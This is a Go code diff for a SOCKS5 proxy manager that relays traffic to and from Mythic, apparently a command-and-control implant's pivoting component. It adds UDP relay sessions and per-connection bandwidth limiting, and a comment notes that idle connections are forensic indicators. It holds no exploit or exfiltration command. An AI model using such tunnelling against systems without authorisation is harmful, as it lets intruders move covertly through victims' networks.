@@ -32,18 +32,22 @@ const (
 // Manager handles all active SOCKS proxy connections
 type Manager struct {
 	connections     map[uint32]net.Conn
+	udpRelays       map[uint32]*udpRelay // UDP ASSOCIATE sessions
 	outbound        []structs.SocksMsg
 	mu              sync.Mutex
-	IdleReadTimeout time.Duration // exported for testing; defaults to idleReadTimeout const
-	Stats           *ConnStats   // connection statistics tracker
+	IdleReadTimeout time.Duration    // exported for testing; defaults to idleReadTimeout const
+	Stats           *ConnStats       // connection statistics tracker
+	Limiters        *perConnLimiters // per-connection bandwidth limiters
 }
 
 // NewManager creates a new SOCKS connection manager
 func NewManager() *Manager {
 	return &Manager{
 		connections:     make(map[uint32]net.Conn),
+		udpRelays:       make(map[uint32]*udpRelay),
 		IdleReadTimeout: idleReadTimeout,
 		Stats:           NewConnStats(100),
+		Limiters:        newPerConnLimiters(),
 	}
 }
 
@@ -55,6 +59,11 @@ func (m *Manager) Close() {
 	for id, conn := range m.connections {
 		conn.Close()
 		delete(m.connections, id)
+	}
+	for id, relay := range m.udpRelays {
+		close(relay.done)
+		relay.conn.Close()
+		delete(m.udpRelays, id)
 	}
 	m.outbound = nil
 }
@@ -76,18 +85,23 @@ func (m *Manager) HandleMessages(msgs []structs.SocksMsg) {
 	for _, msg := range msgs {
 		if msg.Exit {
 			m.closeConnection(msg.ServerId)
+			m.closeUDPRelay(msg.ServerId, "closed")
 			continue
 		}
 
 		m.mu.Lock()
-		conn, exists := m.connections[msg.ServerId]
+		conn, tcpExists := m.connections[msg.ServerId]
+		_, udpExists := m.udpRelays[msg.ServerId]
 		m.mu.Unlock()
 
-		if exists {
-			// Forward data to existing connection
+		if udpExists {
+			// Forward data to existing UDP relay
+			m.forwardUDP(msg.ServerId, msg.Data)
+		} else if tcpExists {
+			// Forward data to existing TCP connection
 			m.forwardData(msg.ServerId, conn, msg.Data)
 		} else {
-			// New connection — parse SOCKS5 CONNECT and establish TCP
+			// New connection — parse SOCKS5 request
 			m.handleNewConnection(msg.ServerId, msg.Data)
 		}
 	}
@@ -102,9 +116,22 @@ func (m *Manager) handleNewConnection(serverId uint32, b64Data string) {
 		return
 	}
 
-	// Parse SOCKS5 CONNECT request (RFC 1928 §4)
-	if data[0] != socksVersion || data[1] != connectCommand {
-		log.Printf("invalid connect sid=%d (ver=%d cmd=%d)", serverId, data[0], data[1])
+	// Parse SOCKS5 request (RFC 1928 §4)
+	if data[0] != socksVersion {
+		log.Printf("invalid version sid=%d (ver=%d)", serverId, data[0])
+		m.sendReply(serverId, replyConnectionRefused)
+		m.queueExit(serverId)
+		return
+	}
+
+	// Route by command type
+	cmd := data[1]
+	if cmd == udpAssociateCommand {
+		m.handleUDPAssociate(serverId, data)
+		return
+	}
+	if cmd != connectCommand {
+		log.Printf("unsupported command sid=%d (cmd=%d)", serverId, cmd)
 		m.sendReply(serverId, replyConnectionRefused)
 		m.queueExit(serverId)
 		return
@@ -193,13 +220,21 @@ func (m *Manager) forwardData(serverId uint32, conn net.Conn, b64Data string) {
 		log.Printf("decode error sid=%d: %v", serverId, err)
 		return
 	}
-	n, err := conn.Write(data)
-	if err != nil {
-		log.Printf("write error sid=%d: %v", serverId, err)
-		m.closeConnection(serverId)
-		return
+
+	// Apply bandwidth limiting
+	rl := m.Limiters.getOrCreate(serverId)
+	written := 0
+	for written < len(data) {
+		allowed := rl.WaitAndAllow(len(data) - written)
+		n, err := conn.Write(data[written : written+allowed])
+		if err != nil {
+			log.Printf("write error sid=%d: %v", serverId, err)
+			m.closeConnection(serverId)
+			return
+		}
+		written += n
+		m.Stats.RecordSend(serverId, n)
 	}
-	m.Stats.RecordSend(serverId, n)
 }
 
 // readFromConnection reads data from a TCP connection and queues it as outbound SOCKS messages.
@@ -208,19 +243,27 @@ func (m *Manager) forwardData(serverId uint32, conn net.Conn, b64Data string) {
 // or crashed services). Long-running idle connections are also forensic indicators.
 func (m *Manager) readFromConnection(serverId uint32, conn net.Conn) {
 	buf := make([]byte, readBufSize)
+	rl := m.Limiters.getOrCreate(serverId)
 	for {
 		conn.SetReadDeadline(time.Now().Add(m.IdleReadTimeout))
 		n, err := conn.Read(buf)
 		if n > 0 {
 			m.Stats.RecordRecv(serverId, n)
-			encoded := base64.StdEncoding.EncodeToString(buf[:n])
-			m.mu.Lock()
-			m.outbound = append(m.outbound, structs.SocksMsg{
-				ServerId: serverId,
-				Data:     encoded,
-				Exit:     false,
-			})
-			m.mu.Unlock()
+
+			// Apply bandwidth limiting — send in chunks if rate limited
+			sent := 0
+			for sent < n {
+				allowed := rl.WaitAndAllow(n - sent)
+				encoded := base64.StdEncoding.EncodeToString(buf[sent : sent+allowed])
+				m.mu.Lock()
+				m.outbound = append(m.outbound, structs.SocksMsg{
+					ServerId: serverId,
+					Data:     encoded,
+					Exit:     false,
+				})
+				m.mu.Unlock()
+				sent += allowed
+			}
 		}
 		if err != nil {
 			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
@@ -268,6 +311,7 @@ func (m *Manager) closeConnection(serverId uint32) {
 	if exists {
 		conn.Close()
 	}
+	m.Limiters.remove(serverId)
 }
 
 // sendReply queues a SOCKS5 reply message back to Mythic
@@ -283,6 +327,17 @@ func (m *Manager) sendReply(serverId uint32, replyCode byte) {
 		Exit:     false,
 	})
 	m.mu.Unlock()
+}
+
+// SetBandwidthLimit sets the per-connection bandwidth limit in bytes/sec.
+// Pass 0 to disable limiting. Only affects new connections.
+func (m *Manager) SetBandwidthLimit(bytesPerSec int64) {
+	m.Limiters.setConfig(BandwidthConfig{BytesPerSec: bytesPerSec})
+}
+
+// GetBandwidthLimit returns the current per-connection bandwidth limit.
+func (m *Manager) GetBandwidthLimit() int64 {
+	return m.Limiters.getConfig().BytesPerSec
 }
 
 // queueExit queues an exit message for a server_id
